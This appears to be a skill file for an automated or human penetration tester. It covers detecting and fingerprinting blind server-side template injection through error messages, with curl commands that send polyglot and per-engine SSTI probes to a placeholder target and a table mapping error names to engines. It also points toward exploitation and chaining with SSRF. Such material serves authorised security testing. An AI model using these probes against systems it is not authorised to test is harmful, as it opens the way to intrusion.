---
name: ssti-error-based-detection
description: Error-based blind SSTI detection using polyglot payloads and error message differentials to fingerprint template engines. Use when template injection is suspected but output appears blind, or when you need to identify the template engine before escalation.
---

# SSTI Error-Based Detection

## Pattern
- Template injection suspected but no reflected output observed
- Application renders verbose error messages on invalid input
- Need to identify template engine before escalation
- Time-based blind SSTI too slow or unreliable

## Workflow

### 1. Send polyglot detector
```bash
# Triggers distinct errors per engine
curl -x localhost:8080 -k "https://target.com/endpoint" \
  -d 'input=${{<%[%'"}}%\.'
```

**Checkpoint:** Compare error response to a normal request. If error message changes, the input reaches a template engine.

### 2. Fingerprint engine via error type
```bash
# Jinja2 (Python)
curl -s "https://target.com/endpoint" -d "input={{7*'7'}}" | rg -i "UndefinedError|jinja2"

# Twig (PHP)
curl -s "https://target.com/endpoint" -d "input={{7*7}}" | rg -i "Twig_Error|twig"

# Freemarker (Java)
curl -s "https://target.com/endpoint" -d 'input=${7*7}' | rg -i "ParseException|freemarker"

# ERB (Ruby)
curl -s "https://target.com/endpoint" -d 'input=<%= 7*7 %>' | rg -i "SyntaxError|erb"

# Velocity (Java)
curl -s "https://target.com/endpoint" -d 'input=#set($x=7*7)$x' | rg -i "MethodInvocation|velocity"
```

**Checkpoint:** Error class names reveal the engine:
- `AttributeError` / `jinja2.exceptions` = Python (Jinja2/Mako)
- `NumberFormatException` / `freemarker.core` = Java (Freemarker/Pebble)
- `Twig_Error_Syntax` / `SmartyCompilerException` = PHP (Twig/Smarty)
- `SyntaxError` = Ruby (ERB)

### 3. Confirm with evaluation probe
If a probe returns `49` or `7777777`, output is not blind -- proceed directly to exploitation.

## Indicators
- Different error types on different payloads = engine fingerprinted
- Stack trace contains engine class names
- Error message includes partial evaluation result

## Chain With
- ssrf-redirect-loop (reach internal template services via SSRF)

## Reference
https://portswigger.net/research/server-side-template-injection
